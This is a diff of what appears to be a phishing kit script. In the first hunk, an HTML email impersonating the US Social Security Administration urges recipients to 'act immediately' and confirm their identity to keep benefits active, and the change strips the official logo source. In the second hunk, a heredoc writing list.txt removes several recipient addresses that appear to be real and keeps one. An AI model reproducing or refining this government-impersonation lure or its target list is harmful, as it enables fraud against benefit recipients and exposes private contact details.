@@ -103,7 +103,7 @@ inherit; font-optical-sizing: inherit; font-kerning: inherit; font-variation-set
 <div style="background: rgb(245, 247, 250); margin: 0px; padding: 20px; border: 0px currentColor; border-image: none; color: rgb(51, 51, 51); line-height: 1.6; font-family: Roboto, sans-serif; font-size: inherit; font-style: inherit; font-variant: inherit; vertical-align: baseline; font-size-adjust: inherit; font-stretch: inherit; font-feature-settings: inherit; font-optical-sizing: inherit; font-kerning: inherit; font-variation-settings: inherit;">
 <div class="x_container" style="background: rgb(255, 255, 255); margin: 0px auto; padding: 35px; border-radius: 10px; border: 0px currentColor; border-image: none; color: inherit; line-height: inherit; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; vertical-align: baseline; max-width: 700px; font-size-adjust: inherit; font-stretch: inherit; box-shadow: 0px 4px 20px rgba(0,0,0,0.1);">
 <div class="x_notice" style="background: rgb(240, 244, 248); border-width: 0px 0px 0px 5px; margin: 0px; padding: 15px; color: inherit; line-height: inherit; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; vertical-align: baseline; border-left-color: rgb(35, 120, 195); border-left-style: solid; font-size-adjust: inherit; font-stretch: inherit;">
-<img style="font: inherit; margin: 0px; padding: 0px; border: 0px currentColor; border-image: none; width: 50px; color: inherit; vertical-align: baseline; font-size-adjust: inherit; font-stretch: inherit;" alt="Home" src="https://ssa.gov/themes/custom/ssa_core/logo.svg" data-imagetype="External"><h2 style="color: rgb(17, 47, 78); font-family: Merriweather, serif;">SSA Official Notice</h2><p>
+<img style="font: inherit; margin: 0px; padding: 0px; border: 0px currentColor; border-image: none; width: 50px; color: inherit; vertical-align: baseline; font-size-adjust: inherit; font-stretch: inherit;" data-imagetype="External"><h2 style="color: rgb(17, 47, 78); font-family: Merriweather, serif;">SSA Official Notice</h2><p>
 Your 2025 Social Security Statement requires immediate review. A new security update mandates identity confirmation to keep your account and benefits active. Act immediately.</p></div><h2 style="color: rgb(17, 47, 78); font-family: Merriweather, serif;">Access Your Statement Now</h2><p>
 This document serves as an official record of your Social Security benefits, Supplemental Security Income (SSI), and Medicare status. This check is required to prevent errors and ensure your payments are accurate.</p>
 <div class="x_download-box" style="background: rgb(237, 239, 240); font: inherit; margin: 20px 0px; padding: 15px; border-radius: 15px; border: 0px currentColor; border-image: none; text-align: center; color: inherit; vertical-align: baseline; font-size-adjust: inherit; font-stretch: inherit;"><p>Securely access your statement using a computer:</p>
@@ -166,11 +166,6 @@ EOL
 # Create a sample txt list content (list.txt)
 echo "Creating list.txt with list content..."
 cat > list.txt <<EOL
-sales@iconicgloballogistics.com.mv
-son_of_grace@hotmail.com
-accounts@mlkschools.ac.zw
-sales@oylogistics.cn
-accounts@reiverswholesale.co.uk
 podpora@vsezapivo.si
 EOL
 
